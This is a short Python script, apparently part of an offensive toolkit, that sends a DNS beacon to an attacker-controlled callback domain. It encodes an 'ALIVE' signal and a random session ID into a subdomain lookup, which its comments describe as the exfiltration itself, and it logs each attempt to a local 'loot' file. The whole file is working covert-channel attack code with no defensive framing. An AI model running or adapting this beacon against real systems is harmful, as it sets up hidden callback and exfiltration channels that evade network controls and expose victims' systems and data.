#!/usr/bin/env python3
import socket
import sys
import os
import uuid

def send_dns_beacon(callback_domain):
    print(f"[*] [Agent 190] DNS-Beacon: Signaling {callback_domain}")
    
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    loot_path = os.path.join(base_dir, "loot", "beacon_log.txt")
    
    # Generate a unique ID for this 'infection' session
    session_id = uuid.uuid4().hex[:8]
    # The 'data' we are exfiltrating (in this case, just a 'ALIVE' signal)
    subdomain_signal = f"ALIVE-{session_id}"
    
    full_query = f"{subdomain_signal}.{callback_domain}"
    
    print(f"[+] Attempting DNS lookup for: {full_query}")
    
    try:
        # We don't care if the lookup fails or succeeds. 
        # The mere act of the request reaching the internet is the exfiltration.
        socket.gethostbyname(full_query)
    except socket.gaierror:
        # This is expected if the domain doesn't actually have an A record
        pass
    except Exception as e:
        print(f"[!] Beacon Error: {e}")

    # Log the attempt locally
    with open(loot_path, "a") as f:
        f.write(f"Beacon Sent: {full_query}\n")
    
    print(f"[*] Beacon logged to {loot_path}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 main.py <your_controlled_domain>")
        sys.exit(1)
    
    send_dns_beacon(sys.argv[1])
